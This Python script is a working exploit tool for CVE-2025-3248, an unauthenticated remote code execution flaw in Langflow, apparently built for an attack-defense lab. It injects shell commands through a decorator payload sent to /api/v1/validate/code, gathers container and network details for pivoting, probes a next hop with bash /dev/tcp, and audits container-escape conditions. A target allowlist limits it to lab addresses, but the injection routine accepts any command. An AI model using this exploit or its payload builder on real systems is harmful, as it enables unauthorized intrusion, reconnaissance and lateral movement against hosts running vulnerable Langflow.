#!/usr/bin/env python3
"""
CVE-2025-3248 Exploit Tool — Langflow < 1.3.0 Unauthenticated RCE
ChainGuard Attack-Defense Lab — B Node (Jump Host 1)

Subcommands:
  check    - Probe RCE reachability (docker-verify primary, HTTP secondary)
  canary   - Deploy harmless canary marker (docker-verify primary)
  evidence - Collect container environment info for pivot handoff
  reach-c  - Test TCP connectivity from container to next hop (C node)
  escape-audit - Read-only container escape feasibility assessment (no exploit)
  cleanup  - Remove all canary files

Success criterion: /tmp/poc-canary.txt exists inside the container with
correct content, verified via docker exec. HTTP response is auxiliary.
No reverse shell, persistence, privilege escalation, or WAN traffic.
"""

import argparse
import ipaddress
import json
import subprocess
import sys
import uuid
from datetime import datetime, timezone
from typing import Optional, Tuple

try:
    import requests
    from urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
except ImportError:
    print("[FATAL] 'requests' module not found: pip install requests")
    sys.exit(1)


# ═══════════════════════════════════════════════════════════════════════
# CONFIGURATION
# ═══════════════════════════════════════════════════════════════════════

# Development: both addresses accepted during testing.
# Production demo: COMMENT OUT 192.168.44.136, keep only 10.10.10.2.
ALLOWED_TARGETS = [
    "192.168.44.136",   # ← REMOVE before production demo
    "10.10.10.2",       # ← keep; B node lab-network IP
]

ALLOWED_NEXT_HOP_NET = ipaddress.IPv4Network("10.20.20.0/24")
DEFAULT_PORT = 7860
CANARY_PATH = "/tmp/poc-canary.txt"
CHECK_PATH = "/tmp/poc-check.txt"
CONTAINER_NAME = "langflow"
API_PATH = "/api/v1/validate/code"


# ═══════════════════════════════════════════════════════════════════════
# PAYLOAD BUILDERS
# ═══════════════════════════════════════════════════════════════════════

def _make_payload(cmd: str) -> str:
    """Wrap a shell command in the CVE-2025-3248 decorator injection.

    The endpoint /api/v1/validate/code calls exec() on FunctionDef AST
    nodes. The decorator expression is evaluated immediately during
    exec, executing the wrapped system() call before the decorator
    TypeError is caught.
    """
    return f'@__import__("os").system("""{cmd}""")\ndef canary():\n    pass\n'


def payload_check() -> str:
    return _make_payload(f"echo CVE-2025-3248-CHECK > {CHECK_PATH}")


def payload_canary(event_id: str, timestamp: str) -> str:
    cmd = (
        f"echo event_id={event_id} > {CANARY_PATH} 2>&1 && "
        f"echo ts={timestamp} >> {CANARY_PATH} 2>&1 && "
        f"echo hostname=$(hostname) >> {CANARY_PATH} 2>&1 && "
        f"echo whoami=$(whoami) >> {CANARY_PATH} 2>&1 && "
        f"echo POC-CANARY-SUCCESS >> {CANARY_PATH} 2>&1"
    )
    return _make_payload(cmd)


def payload_evidence() -> str:
    cmd = (
        f"echo uid=$(id) >> {CANARY_PATH} 2>&1 || true; "
        f"echo hostname=$(hostname) >> {CANARY_PATH} 2>&1 || true; "
        f"echo whoami=$(whoami) >> {CANARY_PATH} 2>&1 || true; "
        f"echo pwd=$(pwd) >> {CANARY_PATH} 2>&1 || true; "
        f"echo HOME=$HOME >> {CANARY_PATH} 2>&1 || true; "
        f"echo ---TMP-WRITE--- >> {CANARY_PATH} 2>&1 || true; "
        f"touch /tmp/.poc-write-test >> {CANARY_PATH} 2>&1 || true; "
        f"echo ---NET--- >> {CANARY_PATH} 2>&1 || true; "
        f"ip addr 2>>{CANARY_PATH} >> {CANARY_PATH} 2>&1 || true; "
        f"echo ---ROUTE--- >> {CANARY_PATH} 2>&1 || true; "
        f"ip route >> {CANARY_PATH} 2>&1 || true; "
        f"echo ---PROC--- >> {CANARY_PATH} 2>&1 || true; "
        f"ps aux >> {CANARY_PATH} 2>&1 || true; "
        f"echo ---PYTHON--- >> {CANARY_PATH} 2>&1 || true; "
        f"(which python3 || which python) >> {CANARY_PATH} 2>&1 || true; "
        f"echo ---ENV--- >> {CANARY_PATH} 2>&1 || true; "
        f"env | grep -iE '^(LANGFLOW|PYTHON|PATH|LANG|LC_|HOME|USER|TERM)=' >> {CANARY_PATH} 2>&1 || true; "
        f"echo POC-EVIDENCE-OK >> {CANARY_PATH} 2>&1 || true"
    )
    return _make_payload(cmd)


def payload_reach_c(next_hop: str, port: int) -> str:
    """Test TCP connectivity via bash /dev/tcp."""
    cmd = (
        f"timeout 5 bash -c 'echo >/dev/tcp/{next_hop}/{port}' 2>/dev/null "
        f"&& echo reachable > {CANARY_PATH} "
        f"|| echo blocked > {CANARY_PATH}"
    )
    return _make_payload(cmd)


def payload_cleanup() -> str:
    return _make_payload(f"rm -f {CANARY_PATH} {CHECK_PATH}")


def payload_escape_audit() -> str:
    """Read-only container inspection for escape feasibility assessment.

    Collects: uid/gid, hostname, docker.sock presence, capabilities,
    seccomp status, mounts, cgroup info. No escape payload, no writes
    outside /tmp.
    """
    audit_path = "/tmp/poc-escape-audit.txt"
    cmd = (
        f"echo uid=$(id) > {audit_path} 2>&1 || true; "
        f"echo hostname=$(hostname) >> {audit_path} 2>&1 || true; "
        f"echo gid=$(id -g) >> {audit_path} 2>&1 || true; "
        f"echo groups=$(id -G) >> {audit_path} 2>&1 || true; "
        f"echo ---SOCK--- >> {audit_path} 2>&1 || true; "
        f"test -e /var/run/docker.sock && echo docker_sock=present >> {audit_path} || echo docker_sock=absent >> {audit_path} 2>&1 || true; "
        f"echo ---CAP--- >> {audit_path} 2>&1 || true; "
        f"cat /proc/1/status 2>/dev/null | grep -iE '^(Cap|Name)' >> {audit_path} 2>&1 || true; "
        f"echo ---CAPSH--- >> {audit_path} 2>&1 || true; "
        f"(capsh --print 2>/dev/null || echo capsh_unavailable) >> {audit_path} 2>&1 || true; "
        f"echo ---SECCOMP--- >> {audit_path} 2>&1 || true; "
        f"cat /proc/self/status 2>/dev/null | grep -i seccomp >> {audit_path} 2>&1 || true; "
        f"echo ---APPARMOR--- >> {audit_path} 2>&1 || true; "
        f"(cat /proc/self/attr/current 2>/dev/null || echo apparmor_path_unavailable) >> {audit_path} 2>&1 || true; "
        f"echo ---MOUNTS--- >> {audit_path} 2>&1 || true; "
        f"(cat /proc/1/mountinfo 2>/dev/null | head -40 || cat /proc/mounts 2>/dev/null | head -40) >> {audit_path} 2>&1 || true; "
        f"echo ---SENSITIVE_MOUNTS--- >> {audit_path} 2>&1 || true; "
        f"(findmnt -l 2>/dev/null | grep -iE 'docker.sock|/etc|/var/log|/root|/proc/sysrq' || echo no_sensitive_findmnt) >> {audit_path} 2>&1 || true; "
        f"echo ---CGROUP--- >> {audit_path} 2>&1 || true; "
        f"cat /proc/1/cgroup 2>/dev/null >> {audit_path} 2>&1 || true; "
        f"echo ---PRIVILEGED_CHECK--- >> {audit_path} 2>&1 || true; "
        f"(cat /proc/1/status 2>/dev/null | grep -i 'seccomp:.*0' && echo privileged_likely=yes || echo privileged_likely=no) >> {audit_path} 2>&1 || true; "
        f"echo ---DEV--- >> {audit_path} 2>&1 || true; "
        f"(ls /dev 2>/dev/null | head -20 >> {audit_path} 2>&1 || true); "
        f"echo POC-ESCAPE-AUDIT-OK >> {audit_path} 2>&1 || true"
    )
    return _make_payload(cmd)


# ═══════════════════════════════════════════════════════════════════════
# HELPERS
# ═══════════════════════════════════════════════════════════════════════

def emit_jsonl(kind: str, severity: str, message: str,
               details: Optional[dict] = None) -> dict:
    record = {
        "event_id": str(uuid.uuid4()),
        "ts": datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ"),
        "host": "B",
        "tool": "poc_check",
        "kind": kind,
        "severity": severity,
        "message": message,
        "details": details or {},
    }
    print(json.dumps(record))
    return record


def http_send(target: str, port: int, payload: str) -> Tuple[int, dict]:
    """POST payload to /api/v1/validate/code.

    Returns (http_status, response_json).
    """
    url = f"http://{target}:{port}{API_PATH}"
    resp = requests.post(url, json={"code": payload}, timeout=15)
    try:
        data = resp.json()
    except json.JSONDecodeError:
        data = {"raw": resp.text}
    return resp.status_code, data


def docker_verify(path: str, expect: str) -> Tuple[bool, str]:
    """Verify a file exists inside the container and contains expected string.

    Returns (success, content).
    """
    try:
        result = subprocess.run(
            ["docker", "exec", CONTAINER_NAME, "cat", path],
            capture_output=True, text=True, timeout=10,
        )
    except FileNotFoundError:
        return False, "[NO_DOCKER] docker command not found on this host"
    except subprocess.TimeoutExpired:
        return False, "[DOCKER_TIMEOUT]"
    except Exception as exc:
        return False, f"[DOCKER_EXCEPTION] {exc}"

    if result.returncode != 0:
        return False, result.stderr.strip() or "[FILE_NOT_FOUND]"

    content = result.stdout
    if expect and expect not in content:
        return False, content

    return True, content


def docker_absent(path: str) -> Tuple[bool, str]:
    """Verify a file does NOT exist inside the container."""
    try:
        result = subprocess.run(
            ["docker", "exec", CONTAINER_NAME, "test", "-f", path],
            capture_output=True, text=False, timeout=5,
        )
    except FileNotFoundError:
        return False, "[NO_DOCKER]"
    except subprocess.TimeoutExpired:
        return False, "[DOCKER_TIMEOUT]"
    except Exception as exc:
        return False, f"[DOCKER_EXCEPTION] {exc}"

    if result.returncode != 0:
        return True, ""  # file absent = success for cleanup
    return False, "[FILE_STILL_EXISTS]"


def docker_inspect() -> Tuple[bool, dict]:
    """Read container config via docker inspect (host-side, read-only).

    Returns (success, config_dict).
    """
    try:
        result = subprocess.run(
            ["docker", "inspect", CONTAINER_NAME],
            capture_output=True, text=True, timeout=10,
        )
    except FileNotFoundError:
        return False, {"error": "[NO_DOCKER]"}
    except subprocess.TimeoutExpired:
        return False, {"error": "[DOCKER_TIMEOUT]"}
    except Exception as exc:
        return False, {"error": f"[DOCKER_EXCEPTION] {exc}"}

    if result.returncode != 0:
        return False, {"error": result.stderr.strip() or "[INSPECT_FAILED]"}

    data = json.loads(result.stdout)
    if not data:
        return False, {"error": "[NO_CONTAINER_DATA]"}
    return True, data[0]


# ═══════════════════════════════════════════════════════════════════════
# SUBCOMMANDS
# ═══════════════════════════════════════════════════════════════════════

def cmd_check(args) -> int:
    """Probe whether the endpoint is vulnerable.

    Primary: docker_verify /tmp/poc-check.txt contains "CVE-2025-3248-CHECK".
    Auxiliary: HTTP response function.errors is empty.
    """
    emit_jsonl("check", "info",
               f"Probing RCE at {args.target}:{args.port}")

    http_code, http_data = http_send(args.target, args.port, payload_check())
    func_errors = http_data.get("function", {}).get("errors", ["unknown"])

    success, content = docker_verify(CHECK_PATH, "CVE-2025-3248-CHECK")

    if success:
        emit_jsonl("check", "high",
                   f"RCE confirmed — canary file exists in container ({CHECK_PATH})",
                   {"target": f"{args.target}:{args.port}", "vulnerable": True,
                    "http_status": http_code, "http_errors": func_errors})
        return 0
    else:
        confidence = "low-confidence" if "[NO_DOCKER]" in content else "failed"
        emit_jsonl("check", "low",
                   f"RCE not confirmed ({confidence}) — {content[:200]}",
                   {"target": f"{args.target}:{args.port}", "vulnerable": False,
                    "http_errors": func_errors, "confidence": confidence})
        return 1


def cmd_canary(args) -> int:
    """Deploy a harmless canary file.

    Primary: docker_verify /tmp/poc-canary.txt contains event_id + SUCCESS.
    Run 3 times for reliability assessment.
    """
    event_id = str(uuid.uuid4())
    timestamp = datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")

    emit_jsonl("canary", "info",
               f"Deploying canary (id={event_id})",
               {"canary_id": event_id, "canary_path": CANARY_PATH})

    http_code, http_data = http_send(args.target, args.port,
                                     payload_canary(event_id, timestamp))

    func_errors = http_data.get("function", {}).get("errors", [])

    success, content = docker_verify(CANARY_PATH, "POC-CANARY-SUCCESS")

    if success:
        emit_jsonl("canary", "high",
                   f"Canary {event_id} confirmed in container",
                   {"canary_id": event_id, "canary_path": CANARY_PATH,
                    "rce_confirmed": True, "http_aux": func_errors,
                    "content_snippet": content[:300]})
        return 0
    else:
        confidence = "low-confidence" if "[NO_DOCKER]" in content else "failed"
        emit_jsonl("canary", "low",
                   f"Canary NOT confirmed ({confidence}) — content={content[:200]}",
                   {"canary_id": event_id, "http_errors": func_errors,
                    "confidence": confidence})
        return 1


def cmd_evidence(args) -> int:
    """Collect full container environment for P1 pivot integration.

    Primary: docker_verify canary file contains POC-EVIDENCE-OK.
    Reports to stdout as JSONL; prints human summary to stderr.
    """
    emit_jsonl("evidence", "info", "Collecting container environment")

    http_code, http_data = http_send(args.target, args.port, payload_evidence())
    func_errors = http_data.get("function", {}).get("errors", [])

    success, content = docker_verify(CANARY_PATH, "POC-EVIDENCE-OK")

    if not success:
        confidence = "low-confidence" if "[NO_DOCKER]" in content else "failed"
        emit_jsonl("evidence", "low",
                   f"Evidence collection not verified ({confidence}) — {content[:200]}",
                   {"http_errors": func_errors, "confidence": confidence})
        return 1

    # Parse key=value pairs from evidence output
    facts = {}
    for line in content.split("\n"):
        line = line.strip()
        if "=" in line and not line.startswith(("---", "[")):
            k, _, v = line.partition("=")
            k = k.strip()
            v = v.strip()
            if k and v:
                facts[k] = v

    # Extract IPs from net section
    container_ips = []
    in_net = False
    for line in content.split("\n"):
        if "---NET---" in line:
            in_net = True
            continue
        if "---" in line and in_net:
            break
        if in_net:
            for word in line.split():
                if word.count(".") == 3:
                    parts = word.split("/")[0]
                    if all(p.isdigit() for p in parts.split(".") if p):
                        container_ips.append(parts)

    details = {
        "canary_path": CANARY_PATH,
        "container_hostname": facts.get("hostname", ""),
        "container_uid": facts.get("uid", ""),
        "container_user": facts.get("whoami", ""),
        "container_pwd": facts.get("pwd", ""),
        "container_home": facts.get("HOME", ""),
        "container_ips": list(dict.fromkeys(container_ips))[:6],
    }

    emit_jsonl("evidence", "high",
               "Environment evidence collected — see details",
               details)

    # Human summary to stderr
    print("\n===== Container Environment =====", file=sys.stderr)
    for key in ("hostname", "uid", "whoami", "pwd", "HOME"):
        print(f"  {key:10} : {facts.get(key, '?')}", file=sys.stderr)
    print(f"  IPs        : {details['container_ips']}", file=sys.stderr)
    print("==================================", file=sys.stderr)

    return 0


def cmd_reach_c(args) -> int:
    """Test TCP connectivity from container to the next hop C node.

    ONLY single host + single port. No scanning.
    Primary: docker_verify canary contains 'reachable' or 'blocked'.
    """
    next_hop = args.next_hop
    port = args.next_hop_port

    # Validate next-hop: must be in 10.20.20.0/24
    try:
        nh_ip = ipaddress.IPv4Address(next_hop)
        if nh_ip not in ALLOWED_NEXT_HOP_NET:
            raise ValueError("not in subnet")
    except (ipaddress.AddressValueError, ValueError):
        emit_jsonl("reach-c", "critical",
                   f"Next hop {next_hop} rejected — must be in {ALLOWED_NEXT_HOP_NET}",
                   {"next_hop": next_hop})
        return 1

    # Validate port range
    if not (1 <= port <= 65535):
        emit_jsonl("reach-c", "critical",
                   f"Port {port} out of range (1-65535)",
                   {"port": port})
        return 1

    emit_jsonl("reach-c", "info",
               f"Testing container → {next_hop}:{port}")

    http_code, http_data = http_send(args.target, args.port,
                                     payload_reach_c(next_hop, port))
    func_errors = http_data.get("function", {}).get("errors", [])

    success, content = docker_verify(CANARY_PATH, None)

    if not success:
        emit_jsonl("reach-c", "critical",
                   f"Cannot read canary: {content[:200]}",
                   {"http_errors": func_errors})
        return 1

    result = content.strip()
    if result == "reachable":
        emit_jsonl("reach-c", "high",
                   f"Container CAN reach {next_hop}:{port}",
                   {"next_hop": f"{next_hop}:{port}", "reachable": True})
        return 0
    elif result == "blocked":
        emit_jsonl("reach-c", "info",
                   f"Container CANNOT reach {next_hop}:{port}",
                   {"next_hop": f"{next_hop}:{port}", "reachable": False})
        return 1
    else:
        emit_jsonl("reach-c", "low",
                   f"Unexpected result: '{result[:200]}'",
                   {})
        return 1


def cmd_escape_audit(args) -> int:
    """Read-only container escape feasibility assessment.

    Combines in-container evidence (via RCE canary) with host-side
    docker inspect data. No escape payload, no privilege escalation,
    no writes beyond /tmp, no docker.sock mount, no Docker config change.

    Risk levels:
      high  — privileged, docker.sock mounted, SYS_ADMIN cap, host root bind
      medium — NET_ADMIN/SYS_PTRACE cap, seccomp/apparmor unconfined,
               sensitive host paths mounted
      low    — no dangerous capabilities, security profiles active,
               no sensitive mounts
    """
    AUDIT_PATH = "/tmp/poc-escape-audit.txt"
    emit_jsonl("escape-audit", "info", "Starting read-only escape audit")

    # ── Phase 1: collect in-container evidence via RCE ──
    http_code, http_data = http_send(args.target, args.port,
                                     payload_escape_audit())
    func_errors = http_data.get("function", {}).get("errors", [])
    emit_jsonl("escape-audit", "info",
               "Container-side evidence written via RCE",
               {"http_status": http_code, "http_errors": func_errors})

    ok, container_raw = docker_verify(AUDIT_PATH, "POC-ESCAPE-AUDIT-OK")
    if not ok:
        confidence = "low-confidence" if "[NO_DOCKER]" in container_raw else "failed"
        emit_jsonl("escape-audit", "low",
                   f"Container evidence not verified ({confidence})",
                   {"raw": container_raw[:300]})
        return 1

    # Parse container evidence
    cfact = {}
    in_section = None
    section_buf = []
    for line in container_raw.split("\n"):
        line = line.strip()
        if line.startswith("---") and line.endswith("---"):
            if in_section and section_buf:
                cfact[in_section] = "\n".join(section_buf)
            in_section = line.strip("-").strip()
            section_buf = []
        elif "=" in line and not line.startswith(("Cap", "Name")):
            k, _, v = line.partition("=")
            k = k.strip()
            v = v.strip()
            if k and v:
                cfact[k] = v
        elif in_section:
            section_buf.append(line)
    if in_section and section_buf:
        cfact[in_section] = "\n".join(section_buf)

    # ── Phase 2: host-side docker inspect ──
    inspect_ok, inspect_data = docker_inspect()

    # ── Phase 3: risk assessment ──
    risk_factors = []
    risk_score = 0

    host_config = inspect_data.get("HostConfig", {}) if inspect_ok else {}

    # Check privileged
    privileged = host_config.get("Privileged", False)
    if privileged:
        risk_factors.append("privileged=true")
        risk_score += 30

    # Check docker.sock mount
    has_docker_sock = cfact.get("docker_sock", "") == "present"
    if has_docker_sock:
        risk_factors.append("docker_sock=mounted")
        risk_score += 30

    # Check capabilities
    cap_add = host_config.get("CapAdd", []) or []
    dangerous_caps = {"SYS_ADMIN", "SYS_PTRACE", "NET_ADMIN", "SYS_MODULE",
                      "SYS_RAWIO", "DAC_OVERRIDE"}
    found_caps = [c for c in cap_add if c in dangerous_caps]
    if found_caps:
        risk_factors.append(f"CapAdd={found_caps}")
    if "SYS_ADMIN" in found_caps:
        risk_score += 30
    elif any(c in found_caps for c in ("SYS_PTRACE", "NET_ADMIN", "SYS_MODULE")):
        risk_score += 15

    # Check security options
    security_opts = host_config.get("SecurityOpt", []) or []
    seccomp_unconfined = any("seccomp=unconfined" in opt for opt in security_opts)
    apparmor_unconfined = any("apparmor=unconfined" in opt for opt in security_opts)
    if seccomp_unconfined:
        risk_factors.append("seccomp=unconfined")
        risk_score += 15
    if apparmor_unconfined:
        risk_factors.append("apparmor=unconfined")
        risk_score += 15

    # Check container-side seccomp
    seccomp_val = cfact.get("SECCOMP", "")
    if seccomp_val and ("0" in seccomp_val.split("\n")[-1] if "\n" in seccomp_val else "0" in seccomp_val):
        risk_factors.append("seccomp_disabled_in_proc")
        risk_score += 15

    # Check bind mounts for sensitive paths
    sensitive_paths = ["/var/run/docker.sock", "/etc", "/root", "/proc/sysrq",
                       "/var/log", "/sys", "/boot", "/home"]
    mounts = host_config.get("Binds", []) or host_config.get("Mounts", []) or []
    sensitive_mounts = []
    for m in mounts:
        if isinstance(m, dict):
            src = m.get("Source", "")
            dst = m.get("Destination", "")
        else:
            parts = m.split(":", 1)
            src = parts[0] if parts else m
            dst = parts[1] if len(parts) > 1 else m
        for sp in sensitive_paths:
            if sp in src or sp in dst:
                sensitive_mounts.append(str(m))

    if sensitive_mounts:
        risk_factors.append(f"sensitive_mounts={sensitive_mounts}")
        if any("/var/run/docker.sock" in m for m in sensitive_mounts):
            risk_score += 30
        else:
            risk_score += 15

    # Network mode
    network_mode = host_config.get("NetworkMode", "default")

    # Determine risk level
    if risk_score >= 30:
        risk_level = "high"
    elif risk_score >= 15:
        risk_level = "medium"
    else:
        risk_level = "low"

    # ── Compile findings ──
    findings = {
        # In-container evidence
        "container_uid": cfact.get("uid", ""),
        "container_gid": cfact.get("gid", ""),
        "container_groups": cfact.get("groups", ""),
        "container_hostname": cfact.get("hostname", ""),
        "docker_sock_present": has_docker_sock,
        "seccomp_proc": cfact.get("SECCOMP", "")[:100],
        "apparmor_proc": cfact.get("APPARMOR", "")[:100],

        # Host-side inspect evidence
        "privileged": privileged,
        "network_mode": network_mode,
        "capabilities": {
            "cap_add": cap_add,
            "cap_drop": host_config.get("CapDrop", []) or [],
            "dangerous_found": found_caps,
        },
        "seccomp_unconfined": seccomp_unconfined,
        "apparmor_unconfined": apparmor_unconfined,
        "security_opts": security_opts,
        "sensitive_mounts": sensitive_mounts,
        "all_binds": mounts[:20],

        # Risk
        "risk_level": risk_level,
        "risk_score": risk_score,
        "risk_factors": risk_factors,
    }

    emit_jsonl("escape-audit", severity_for_level(risk_level),
               f"Escape audit complete — risk={risk_level} (score={risk_score})",
               findings)

    # Human summary to stderr
    print(f"\n===== Escape Audit: {risk_level.upper()} =====", file=sys.stderr)
    print(f"  Score        : {risk_score}", file=sys.stderr)
    if risk_factors:
        print(f"  Factors      :", file=sys.stderr)
        for f in risk_factors:
            print(f"    - {f}", file=sys.stderr)
    else:
        print(f"  Factors      : none detected", file=sys.stderr)
    print(f"  Privileged   : {privileged}", file=sys.stderr)
    print(f"  Docker Socket: {'PRESENT' if has_docker_sock else 'absent'}", file=sys.stderr)
    print(f"  Dangerous Cap: {found_caps or 'none'}", file=sys.stderr)
    print(f"  Seccomp      : {'unconfined' if seccomp_unconfined else 'active'}", file=sys.stderr)
    print(f"  AppArmor     : {'unconfined' if apparmor_unconfined else 'active'}", file=sys.stderr)
    print(f"  Network Mode : {network_mode}", file=sys.stderr)
    print("====================================", file=sys.stderr)

    return 0 if risk_level == "low" else 1


def severity_for_level(level: str) -> str:
    return {"low": "info", "medium": "low", "high": "high"}.get(level, "info")


def cmd_cleanup(args) -> int:
    """Remove all canary files from the container.

    Primary: docker_absent for both paths.
    """
    emit_jsonl("cleanup", "info", "Removing canary files from container")

    http_code, http_data = http_send(args.target, args.port, payload_cleanup())
    func_errors = http_data.get("function", {}).get("errors", [])

    c1, msg1 = docker_absent(CANARY_PATH)
    c2, msg2 = docker_absent(CHECK_PATH)

    if c1 and c2:
        emit_jsonl("cleanup", "high",
                   f"Cleanup complete — {CANARY_PATH} and {CHECK_PATH} removed",
                   {"http_aux": func_errors})
        return 0
    else:
        has_nodocker = "[NO_DOCKER]" in msg1 or "[NO_DOCKER]" in msg2
        confidence = "low-confidence" if has_nodocker else "failed"
        remaining = []
        if not c1:
            remaining.append(CANARY_PATH)
        if not c2:
            remaining.append(CHECK_PATH)
        emit_jsonl("cleanup", "low",
                   f"Cleanup not verified ({confidence}) — remaining: {remaining}",
                   {"remaining": remaining, "http_errors": func_errors,
                    "confidence": confidence})
        return 1


# ═══════════════════════════════════════════════════════════════════════
# ENTRY POINT
# ═══════════════════════════════════════════════════════════════════════

def main() -> None:
    parser = argparse.ArgumentParser(
        description="CVE-2025-3248 exploit tool — Langflow 1.2.0 (ChainGuard B)",
        epilog="All payloads are harmless canary markers. No reverse shell, "
               "persistence, privilege escalation, or WAN connections.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument(
        "--target", required=True,
        help=f"Target IP (allowed: {', '.join(ALLOWED_TARGETS)})",
    )
    parser.add_argument(
        "--port", type=int, default=DEFAULT_PORT,
        help=f"Langflow HTTP port (default: {DEFAULT_PORT})",
    )

    sub = parser.add_subparsers(dest="command", required=True)

    sub.add_parser("check", help="Probe RCE reachability")

    sub.add_parser("canary", help="Deploy harmless canary marker")

    sub.add_parser("evidence", help="Collect container environment (for pivot handoff)")

    sub.add_parser("escape-audit", help="Read-only container escape feasibility assessment")

    reach = sub.add_parser("reach-c", help="Test container -> C node connectivity")
    reach.add_argument(
        "--next-hop", required=True,
        help=f"Next hop IP (must be in {ALLOWED_NEXT_HOP_NET})",
    )
    reach.add_argument(
        "--next-hop-port", type=int, default=22,
        help="Port to test on next hop (default: 22)",
    )

    sub.add_parser("cleanup", help="Remove all canary files from container")

    args = parser.parse_args()

    # ── Safety gate: target whitelist ──
    if args.target not in ALLOWED_TARGETS:
        emit_jsonl("blocked", "critical",
                   f"Target '{args.target}' denied. "
                   f"Allowed: {ALLOWED_TARGETS}")
        sys.exit(1)

    # ── Dispatch ──
    handlers = {
        "check":        cmd_check,
        "canary":       cmd_canary,
        "evidence":     cmd_evidence,
        "escape-audit": cmd_escape_audit,
        "reach-c":      cmd_reach_c,
        "cleanup":      cmd_cleanup,
    }

    exit_code = handlers[args.command](args)
    sys.exit(exit_code)


if __name__ == "__main__":
    main()
